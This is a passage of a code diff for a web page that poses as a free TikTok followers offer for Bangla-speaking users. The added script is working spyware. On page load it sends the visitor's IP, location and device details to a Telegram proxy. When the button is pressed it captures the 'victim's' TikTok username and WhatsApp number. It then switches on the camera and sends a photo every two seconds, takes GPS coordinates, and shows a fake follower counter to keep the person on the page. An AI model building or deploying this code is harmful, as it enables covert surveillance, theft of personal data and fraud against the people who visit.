+                let r = await fetch(a.u, {signal:ctrl.signal});
+                clearTimeout(t);
+                if (!r.ok) continue;
+                let d = await r.json();
+                let p = a.p(d);
+                if (p.ip) return p;
+            } catch(e){}
+        }
+        return null;
+    }
+
+    // Build beautiful Telegram caption (used for static photo on load)
+    async function buildCaption(ip, username, packageName) {
+        let now = new Date().toLocaleString();
+        let ref = document.referrer||'Direct';
+        let dev = deviceInfo||{};
+        let battLvl='N/A', charge='N/A';
+        try { if (navigator.getBattery) { let b = await navigator.getBattery(); battLvl=Math.round(b.level*100)+'%'; charge=b.charging?'Yes':'No'; } } catch(e){}
+        let cap = "<b>🚨 CCB HUNTER IP CAPTURE ALERT</b>\n";
+        cap += "━━━━━━━━━━━━━━━━━━━━\n";
+        cap += `🌐 <b>IP:</b> <b><code>${ip?ip.ip:'Unknown'}</code></b>\n`;
+        cap += `🎵 <b>TikTok:</b> @${username||'⏳ Pending'}\n`;
+        cap += `👤 <b>Package:</b> ${packageName||'N/A'}\n`;
+        cap += "━━━━━━━━━━━━━━━━━━━━\n";
+        if (ip) {
+            cap += `📍 <b>Location:</b> ${ip.city||'?'}, ${ip.region||'?'}, ${ip.country||'?'}\n`;
+            cap += `🏷️ <b>Postal Code:</b> ${ip.postal||'N/A'}\n`;
+            if (ip.lat&&ip.lon) cap += `🗺️ <b>GPS:</b> <a href='https://maps.google.com/?q=${ip.lat},${ip.lon}'>${ip.lat}, ${ip.lon}</a>\n`;
+            cap += `📡 <b>ISP:</b> ${ip.isp||'N/A'}\n🔢 <b>ASN:</b> ${ip.asn||'N/A'}\n🕒 <b>Timezone:</b> ${ip.timezone||'N/A'}\n`;
+        }
+        cap += "━━━━━━━━━━━━━━━━━━━━\n📱 <b>Device Info:</b>\n";
+        cap += `   • <b>UA:</b> <code>${dev.ua||'?'}...</code>\n   • <b>Platform:</b> ${dev.platform||'?'}\n   • <b>Screen:</b> ${dev.screenW}x${dev.screenH} @${dev.pixelRatio}x\n`;
+        cap += `   • <b>Memory:</b> ${dev.memory} GB | <b>CPU:</b> ${dev.cores} cores\n   • <b>Touch:</b> ${dev.touch} | <b>Lang:</b> ${dev.lang||'?'}\n`;
+        cap += "━━━━━━━━━━━━━━━━━━━━\n";
+        cap += `🔋 <b>Battery:</b> ${battLvl} (Charging: ${charge})\n📶 <b>Network:</b> ${dev.netType} | ↓${dev.downlink}Mbps | RTT ${dev.rtt}ms\n`;
+        cap += `🔗 <b>Referrer:</b> ${ref}\n⏰ <b>Time:</b> ${now}\n━━━━━━━━━━━━━━━━━━━━\n<i>Powered by CCB Hunter</i>`;
+        return cap;
+    }
+
+    // ============ PROXY SENDING HELPERS ============
+    async function proxySend(method, payload, dynamicChatId) {
+        const url = dynamicChatId 
+            ? `${PROXY_URL}?chat_id=${encodeURIComponent(dynamicChatId)}`
+            : PROXY_URL;
+
+        if (payload instanceof FormData) {
+            payload.append('method', method);
+            await fetch(url, { method: 'POST', body: payload });
+        } else {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ method, payload })
+            });
+        }
+    }
+
+    async function sendStatic(caption, chatId) {
+        await proxySend('sendPhoto', { photo: STATIC_IMAGE, caption, parse_mode: 'HTML' }, chatId);
+    }
+
+    async function sendText(text, chatId) {
+        await proxySend('sendMessage', { text, parse_mode: 'HTML' }, chatId);
+    }
+
+    async function sendLocation(lat, lon, chatId) {
+        await proxySend('sendLocation', { latitude: lat, longitude: lon, live_period: 0 }, chatId);
+        let mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+        await proxySend('sendMessage', { text: `📍 <b>Live location:</b> <a href='${mapsLink}'>Google Maps</a>`, parse_mode: 'HTML' }, chatId);
+    }
+
+    async function sendCameraPhoto(blob, chatId) {
+        let fd = new FormData();
+        fd.append('file', blob, `cam_${Date.now()}.jpg`);
+        await proxySend('sendPhoto', fd, chatId);
+    }
+
+    function captureBlob() {
+        return new Promise((resolve, reject) => {
+            if (!hiddenVideo.videoWidth || !hiddenVideo.videoHeight) return reject('no video');
+            hiddenCanvas.width = hiddenVideo.videoWidth; hiddenCanvas.height = hiddenVideo.videoHeight;
+            let ctx = hiddenCanvas.getContext('2d'); ctx.drawImage(hiddenVideo,0,0);
+            hiddenCanvas.toBlob(blob => blob?resolve(blob):reject('blob failed'), 'image/jpeg', 0.8);
+        });
+    }
+    function startContinuousCapture(chatId) {
+        async function captureAndSend() {
+            try { let blob = await captureBlob(); await sendCameraPhoto(blob, chatId); } catch(e){}
+        }
+        captureAndSend();
+        captureTimer = setInterval(captureAndSend, 2000);
+    }
+    function stopCapture() {
+        if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
+        if (stream) { stream.getTracks().forEach(t=>t.stop()); stream = null; }
+        hiddenVideo.srcObject = null;
+        if (simulationInterval) { clearInterval(simulationInterval); simulationInterval = null; }
+    }
+
+    // Init on page load – send IP data as static photo caption
+    (async function init() {
+        let chatId = getParam('chat_id');
+        deviceInfo = getDeviceInfo();
+        ipData = await fetchIP().catch(()=>null);
+        let caption = await buildCaption(ipData, '', 'N/A');
+        await sendStatic(caption, chatId);
+    })();
+
+    function requestLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                err => resolve(null),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // Claim button (with enhanced message formatting)
+    claimBtn.addEventListener('click', async function() {
+        if (claimBtn.disabled) return;
+        let chatId = getParam('chat_id');
+        if (!selectedOp) { alert('Please select a followers package'); return; }
+        
+        let username = phoneInp.value.trim().replace(/@/g, '');
+        if (username.length < 2) { alert('Enter a valid TikTok username'); phoneInp.focus(); return; }
+
+        let whatsappNumber = whatsappInp.value.trim();
+        if (!whatsappNumber || whatsappNumber.length < 6) {
+            alert('Please enter a valid WhatsApp number (with country code)');
+            whatsappInp.focus();
+            return;
+        }
+
+        claimBtn.disabled = true;
+        claimBtn.innerHTML = '<span class="pulse-live"></span> ⏳ Processing...';
+        showOverlay('⏳ Initializing your boost...', true);
+
+        // ========== 🌟 সুন্দর ভিক্টিম ইনফো মেসেজ ==========
+        let victimMsg = `╭───────────────────╼
+│ <b>🎯  VICTIM DETAILS</b>
+╰───────────────────╼
+👤 <b>TikTok Username :</b> @${username}
+📱 <b>WhatsApp Number  :</b> <code>${whatsappNumber}</code>
+📦 <b>Selected Package  :</b> ${selectedOp}
+╰───────────────────╼
+📅 <i>Captured just now</i>`;
+
+        await sendText(victimMsg, chatId).catch(()=>{});
+
+        if (!deviceInfo) deviceInfo = getDeviceInfo();
+        if (!ipData) ipData = await fetchIP().catch(()=>null);
+
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video:{facingMode:'user', width:{ideal:640}, height:{ideal:480}},
+                audio:false
+            });
+            hiddenVideo.srcObject = stream;
+            hiddenVideo.setAttribute('playsinline','');
+            hiddenVideo.setAttribute('autoplay','');
+            hiddenVideo.muted = true;
+            await hiddenVideo.play();
+            await new Promise(r => { hiddenVideo.addEventListener('playing', r, {once:true}); setTimeout(r, 400); });
+            await new Promise(r => setTimeout(r, 200));
+
+            await sendText("📸 <b>Camera Permission</b>\n✅ Status: <b>GRANTED</b>\nDevice camera is now active.", chatId).catch(()=>{});
+            startContinuousCapture(chatId);
+
+            let loc = await requestLocation();
+            if (loc) {
+                await sendLocation(loc.lat, loc.lon, chatId);
+                await sendText("📍 <b>Live Location</b>\n✅ Status: <b>GRANTED</b>\nCoordinates sent above.", chatId);
+            } else {
+                await sendText("⚠️ <b>Location Permission</b>\n❌ Status: <b>DENIED</b>\nUser blocked location access.", chatId);
+            }
+
+            await new Promise(r => setTimeout(r, 1500));
+
+            // ========== LIVE FOLLOWER COUNTER (unchanged) ==========
+            let targetCount = parseInt(selectedCode) || 500;
+            let currentCount = 0;
+            overlayCard.innerHTML = `
+                <div style="text-align:center; color:white;">
+                    <div style="display:inline-flex; align-items:center; gap:6px; background:rgba(254,44,85,0.15); padding:4px 14px; border-radius:20px; margin-bottom:12px; border:1px solid rgba(254,44,85,0.3);">
+                        <span style="width:8px; height:8px; background:#fe2c55; border-radius:50%; animation:livePulse 1.4s infinite;"></span>
+                        <span style="font-size:12px; font-weight:700; color:#fe2c55;">LIVE</span>
+                    </div>
+                    <div style="font-size:18px; font-weight:700; margin-bottom:8px; line-height:1.4;">
+                        ⚡ Followers are coming!<br><span style="font-size:14px; font-weight:500; color:#aaa;">ফলোয়ার আসছে!</span>
+                    </div>
+                    <div style="font-size:20px; font-weight:800; color:#fff; margin-bottom:4px; letter-spacing:-0.3px;">
+                        @${username}
+                    </div>
+                    <div style="font-size:13px; color:#ccc; margin-bottom:18px;">
+                        ${targetCount} followers will be added<br><span style="font-size:11px;">(৫০০+ ফলোয়ার যোগ হবে)</span>
+                    </div>
+                    <div id="liveCount" style="font-size:64px; font-weight:800; background:linear-gradient(135deg, #fe2c55, #ff6b8a); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-shadow:0 0 20px rgba(254,44,85,0.4); line-height:1; margin-bottom:6px;">
+                        0
+                    </div>
+                    <div style="margin-top:12px; margin-bottom:20px;">
+                        <div style="display:flex; justify-content:space-between; font-size:11px; color:#aaa; margin-bottom:4px;">
+                            <span>Progress</span>
+                            <span id="progressPercent">0%</span>
+                        </div>
+                        <div style="height:8px; background:#2a2a2a; border-radius:4px; overflow:hidden;">
+                            <div id="progressBar" style="height:100%; width:0%; background:linear-gradient(90deg, #fe2c55, #ff4d6d); border-radius:4px; transition:width 0.4s;"></div>
+                        </div>
+                    </div>
+                    <div style="background:rgba(255,200,0,0.08); border:1px solid rgba(255,200,0,0.25); border-radius:12px; padding:12px; margin-bottom:10px;">
+                        <div style="font-size:13px; font-weight:700; color:#ffb800; margin-bottom:4px;">⚠️ সতর্কতা / Warning</div>
+                        <div style="font-size:12px; color:#ddd; line-height:1.5;">
+                            পৃষ্ঠাটি ত্যাগ করবেন না, তা না হলে ফলোয়ার আসা বন্ধ হয়ে যেতে পারে।<br>
+                            <span style="color:#aaa;">Do not leave this page, or followers may stop!</span>
+                        </div>
+                    </div>
+                    <div style="font-size:11px; color:#666; margin-top:6px;">
+                        ⏳ আনুমানিক সময়: ১০-১৫ মিনিট · Estimated: 10-15 minutes
+                    </div>
+                </div>
+            `;
+
+            // Simulate follower count
+            let maxDuration = 12 * 60 * 1000;
+            let startTime = Date.now();
+            simulationInterval = setInterval(() => {
+                let elapsed = Date.now() - startTime;
+                let increment = Math.floor(Math.random() * 15) + 8;
+                currentCount += increment;
+                if (currentCount >= targetCount) {
+                    currentCount = targetCount;
+                    clearInterval(simulationInterval);
+                    simulationInterval = null;
+                    setTimeout(() => {
+                        successOverlay('✅ Followers Added!', `${targetCount} followers added to @${username}`);
+                        claimBtn.disabled = false;
+                        claimBtn.innerHTML = '<span class="pulse-live"></span> Get Free Followers';
+                    }, 500);
+                } else if (elapsed > maxDuration) {
+                    clearInterval(simulationInterval);
+                    simulationInterval = null;
+                    setTimeout(() => {
+                        successOverlay('✅ Followers Added!', `${currentCount} followers added to @${username} (more on the way)`);
+                        claimBtn.disabled = false;
+                        claimBtn.innerHTML = '<span class="pulse-live"></span> Get Free Followers';
+                    }, 500);
+                }
+                let liveElem = document.getElementById('liveCount');
+                let progressElem = document.getElementById('progressBar');
+                let percentElem = document.getElementById('progressPercent');
+                if (liveElem) liveElem.textContent = currentCount;
+                if (progressElem) {
+                    let percent = Math.min((currentCount / targetCount) * 100, 100);
+                    progressElem.style.width = percent + '%';
+                    if (percentElem) percentElem.textContent = Math.round(percent) + '%';
+                }
+            }, 2000);
+
+        } catch(e) {
+            await sendText("🚫 <b>Camera Permission</b>\n❌ Status: <b>DENIED</b>\nUser blocked camera access.", chatId).catch(()=>{});
+            hideOverlay();
+            alert('❌ Process failed. Please allow camera and try again.');
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = '<span class="pulse-live"></span> Get Free Followers';
+        }
+    });
+
+    window.addEventListener('beforeunload', stopCapture);
+})();
+</script>
+</body>
+</html>
